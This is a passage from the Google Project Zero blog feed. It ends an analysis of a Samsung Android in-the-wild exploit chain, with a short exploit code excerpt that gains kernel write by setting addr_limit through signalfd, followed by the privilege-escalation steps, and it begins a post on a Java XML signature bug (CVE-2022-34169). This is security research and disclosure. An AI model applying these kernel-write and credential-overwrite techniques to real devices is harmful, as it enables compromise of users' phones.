class=\"vdnyYxSRCi-c4\"&gt;kernel_rw_pipe2&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;buf_len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;// [1]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; write&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kernel_rw_pipe2&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;USER_DS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;8u&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;// [2]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; set_addr_limit_to_KERNEL_DS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;();&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;// [3] &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; read&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kernel_rw_pipe&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;kaddr&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;buf_len&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;// [4]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; read&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;kernel_rw_pipe&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;addr_limit_ptr&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;8u&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;// [5]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c33\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span&gt;The function takes three arguments: the kernel address to write to (&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kaddr&lt;/span&gt;&lt;span&gt;), a pointer to the buffer of contents to write (&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;buf&lt;/span&gt;&lt;span&gt;), and the length of the buffer (&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;buf_len&lt;/span&gt;&lt;span&gt;). &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;buf&lt;/span&gt;&lt;span&gt;&amp;nbsp;is in userspace. When the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kernel_write&lt;/span&gt;&lt;span&gt;&amp;nbsp;function is entered, the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;is currently set to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;USER_DS&lt;/span&gt;&lt;span&gt;. At [1] the exploit writes the buffer pointer to the pipe. A pointer to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;USER_DS&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;value is written to the pipe at [2].&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;set_addr_limit_to_KERNEL_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;function at [3] sends a signal to tell another process in the exploit to call &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;with a mask of 0. Because &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signalfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;performs a NOT on the bits provided in the mask in &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;signotset&lt;/span&gt;&lt;span&gt;, the value &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;0xFFFFFFFFFFFFFFFF&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span&gt;) is written to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span&gt;Now that the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;is set to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;KERNEL_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;the exploit can access kernel memory. At [4], the exploit reads from the pipe, writing the contents to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;kaddr&lt;/span&gt;&lt;span&gt;. Then at [5] the exploit returns &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;&amp;nbsp;back to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;USER_DS&lt;/span&gt;&lt;span&gt;&amp;nbsp;by reading the value from the pipe that was written at [2] and writing it back to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. The exploit&amp;rsquo;s function to read from kernel memory is the mirror image of this function.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span&gt;I deliberately am not calling this a bypass because UAO and PAN are acting exactly as they were designed to act: preventing the kernel from accessing user-space memory. UAO and PAN were not developed to protect against arbitrary write access to the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;addr_limit&lt;/span&gt;&lt;span&gt;. &lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"vdnyYxSRCi-c17\" id=\"h.2exfdp6lv8zm\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;Post-exploitation&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;T&lt;/span&gt;&lt;span&gt;he exploit now has arbitrary &lt;/span&gt;&lt;span&gt;kernel read and write&lt;/span&gt;&lt;span&gt;. It then follows the steps as seen in most other Android exploits: overwrite the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;cred&lt;/span&gt;&lt;span&gt;&amp;nbsp;struct for the current process and overwrite the loaded SELinux policy to change the current process&amp;rsquo;s context to &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;vold&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;vold&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the &amp;ldquo;Volume Daemon&amp;rdquo; which is responsible for mounting and unmounting of external storage. &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;vold&lt;/span&gt;&lt;span&gt;&amp;nbsp;runs as &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;root&lt;/span&gt;&lt;span&gt;&amp;nbsp;and while it&amp;#39;s a userspace service, it&amp;rsquo;s considered kernel-equivalent as described in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://source.android.com/docs/security/overview/updates-resources#process_types\"&gt;Android documentation on security contexts&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Because it&amp;rsquo;s a highly privileged security context, it makes a prime target for changing the SELinux context to.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNmMRLkK2FzuHtZxYxOkwpwKjbotI2a0OrAKlIWHd24SXekvuwcem4iCOzsu3ssOq2eqwDeWZi9uaLjfh1oh8a1_foBtkvDt4qM-vqbT3wEp-dmVnv4DZHos2mtCe2nFBGe1ZmxDLOXdOuSyBu0_qRdxQvc0nfDltRu3IftdQ2rVH47dTN_qWAExff/s920/image5.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNmMRLkK2FzuHtZxYxOkwpwKjbotI2a0OrAKlIWHd24SXekvuwcem4iCOzsu3ssOq2eqwDeWZi9uaLjfh1oh8a1_foBtkvDt4qM-vqbT3wEp-dmVnv4DZHos2mtCe2nFBGe1ZmxDLOXdOuSyBu0_qRdxQvc0nfDltRu3IftdQ2rVH47dTN_qWAExff/s920/image5.png\" border=\"0\" alt=\"Screen shot of the &amp;amp;quot;OS Kernel&amp;amp;quot; section from https://source.android.com/docs/security/overview/updates-resources#process_types. It says: &amp;nbsp;Functionality that: - is part of the kernel - runs in the same CPU context as the kernel (for example, device drivers) - has direct access to kernel memory (for example, hardware components on the device) - has the capability to load scripts into a kernel component (for example, eBPF) - is one of a handful of user services that&amp;#39;s considered kernel equivalent (such as, apexd, bpfloader, init, ueventd, and vold).\" style=\"max-height: 750px; max-width: 600px;\"title=\"Screen shot of the &amp;amp;quot;OS Kernel&amp;amp;quot; section from https://source.android.com/docs/security/overview/updates-resources#process_types. It says: &amp;nbsp;Functionality that: - is part of the kernel - runs in the same CPU context as the kernel (for example, device drivers) - has direct access to kernel memory (for example, hardware components on the device) - has the capability to load scripts into a kernel component (for example, eBPF) - is one of a handful of user services that&amp;#39;s considered kernel equivalent (such as, apexd, bpfloader, init, ueventd, and vold).\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;As stated at the beginning of this post, the sample obtained was discovered in the preparatory stages of the attack. Unfortunately, it did not include the final payload that would have been deployed with this exploit.&lt;/span&gt;&lt;/p&gt;&lt;h1 class=\"vdnyYxSRCi-c8 vdnyYxSRCi-c28\" id=\"h.5zhj1ffk4us0\"&gt;&lt;span class=\"vdnyYxSRCi-c31\"&gt;Conclusion&lt;/span&gt;&lt;/h1&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;This in-the-wild exploit chain is a great example of different attack surfaces and &amp;ldquo;shape&amp;rdquo; than many of the Android exploits we&amp;rsquo;ve seen in the past. All three vulnerabilities in this chain were in the manufacturer&amp;rsquo;s custom components rather than in the AOSP platform or the Linux kernel. It&amp;rsquo;s also interesting to note that 2 out of the 3 vulnerabilities were logic and design vulnerabilities rather than memory safety. Of the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=1190662839\"&gt;10 other Android in-the-wild 0-days&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;that we&amp;rsquo;ve tracked since mid-2014, only 2 of those were not memory corruption vulnerabilities.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The first vulnerability in this chain, the arbitrary file read and write, CVE-2021-25337, was the foundation of this chain, used &lt;/span&gt;&lt;span&gt;4&lt;/span&gt;&lt;span&gt;&amp;nbsp;different times and used at least once in each step. The vulnerability was in the Java code of a custom content provider in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;system_server&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;. The Java components in Android devices don&amp;rsquo;t tend to be the most popular targets for security researchers despite it running at such a privileged level. This highlights an area for further research.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;Labeling when vulnerabilities are known to be exploited in-the-wild is important both for targeted users and for the security industry. When in-the-wild 0-days are not transparently disclosed, we are not able to use that information to further protect users, using patch analysis and variant analysis, to gain an understanding of what attackers already know. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;The analysis of this exploit chain has provided us with new and important insights into how attackers are targeting Android devices. It highlights a need for more research into manufacturer specific components. It shows where we ought to do further variant analysis. It is a good example of how Android exploits can take many different &amp;ldquo;shapes&amp;rdquo; and so brainstorming different detection ideas is a worthwhile exercise. But in this case, we&amp;rsquo;re at least 18 months behind the attackers: they already know which bugs they&amp;rsquo;re exploiting and so when this information is not shared transparently, it leaves defenders at a further disadvantage. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;This transparent disclosure of in-the-wild status is necessary for both the safety and autonomy of targeted users to protect themselves &lt;/span&gt;&lt;span&gt;as well as&lt;/span&gt;&lt;span&gt;&amp;nbsp;the security industry to work together to best prevent these 0-days in the future.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/5910791167813767823/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5910791167813767823"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5910791167813767823"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/11/a-very-powerful-clipboard-samsung-in-the-wild-exploit-chain.html","@title":"A Very Powerful Clipboard: Analysis of a Samsung in-the-wild exploit chain"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgnrMtDmG4HptsA4AWfg404rrysHRNHsnGwDE6LY1iWCH2ywFNiQy4qn6yuV9ONlcJ2_YilTV8pd1um42sMKqVhKQliJWco-ZF9Vq0z24fCavXMMcM6jsFLP-JDuw726K7zXOtvC5Cb4K_bWcNUkl3Y2hlWwiIGS0FOjkJNG1oWDSQ7bc9RGm6ZUQXN/s72-c/image2.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-8124034966884170870","published":"2022-11-02T04:41:00.009-07:00","updated":"2022-11-04T07:39:42.482-07:00","title":{"@type":"text","#text":"Gregor Samsa: Exploiting Java's XML Signature Verification"},"content":{"@type":"html","#text":"&lt;p&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; white-space: pre-wrap;\"&gt;By Felix Wilhelm, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;span id=\"docs-internal-guid-0bf8d8bf-7fff-3b3e-e15a-d0b22634204a\"&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Earlier this year, I discovered a surprising attack surface hidden deep inside Java’s standard library: A custom JIT compiler processing untrusted XSLT programs, exposed to remote attackers during XML signature verification. This post discusses &lt;/span&gt;&lt;a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2290&amp;amp;q=reporter%3Ame&amp;amp;can=1\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;CVE-2022-34169&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, an integer truncation bug in this JIT compiler resulting in arbitrary code execution in many Java-based web applications and identity providers that support the SAML single-sign-on standard.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;OpenJDK fixed the discussed issue in &lt;/span&gt;&lt;a href=\"https://openjdk.org/groups/vulnerability/advisories/2022-07-19\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;July 2022&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. The Apache BCEL project used by Xalan-J, the origin of the vulnerable code, released a patch in &lt;/span&gt;&lt;a href=\"https://github.com/apache/commons-bcel/commit/f3267cbcc900f80851d561bdd16b239d936947f5\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;September 2022&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;While the vulnerability discussed in this post has been patched , vendors and users should expect further vulnerabilities in SAML.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;From a security researcher's perspective, this vulnerability is an example of an integer truncation issue in a memory-safe language, with an exploit that feels very much like a memory corruption. While less common than the typical memory safety issues of C or C++ codebases, weird machines still exist in memory safe languages and will keep us busy even after we move into a bright memory safe future.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Before diving into the vulnerability and its exploit, I’m going to give a quick overview of XML signatures and SAML. What makes XML signatures such an interesting target and why should we care about them?&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Introduction&lt;/span&gt;&lt;/h2&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;XML Signatures are a typical example of a security protocol invented in the early 2000’s. They suffer from high complexity, a large attack surface and a wealth of configurable features that can weaken or break its security guarantees in surprising ways. Modern usage of XML signatures is mostly restricted to somewhat obscure protocols and legacy applications, but there is one important exception: SAML. SAML, which stands for Security Assertion Markup Language, is one of the two main Single-Sign-On standards used in modern web applications. While its alternative, the OAuth based OpenID Connect (OIDC) is gaining popularity, SAML is still the de-facto standard for large enterprises and complex integrations.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SAML relies on XML signatures to protect messages forwarded through the browser. This turns XML signature verification into a very interesting external attack surface for attacking modern multi-tenant SaaS applications. While you don’t need a detailed understanding of SAML to follow this post, interested readers can take a look at Okta's &lt;/span&gt;&lt;a href=\"https://developer.okta.com/docs/concepts/saml/\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Understanding SAML&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; writeup or the &lt;/span&gt;&lt;a href=\"https://en.wikipedia.org/wiki/SAML_2.0\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;SAML 2.0 wiki&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; entry to get a better understanding of the protocol.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;SAML SSO logins work by exchanging XML documents between the application, known as service provider (SP), and the identity provider (IdP). When a user tries to login to an SP, the service provider creates a SAML request. The IdP looks at the SAML request, tries to authenticate the user and sends a SAML response back to the SP. A successful response will contain information about the user, which the application can then use to grant access to its resources.&amp;nbsp;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;In the most widely used SAML flow (known as SP Redirect Bind / IdP POST Response) these documents are forwarded through the user's browser using HTTP redirects and POST requests. To protect against modification by the user, the security critical part of the SAML response (known as Assertion) has to be cryptographically signed by the IdP. In addition, the IdP might require SPs to also 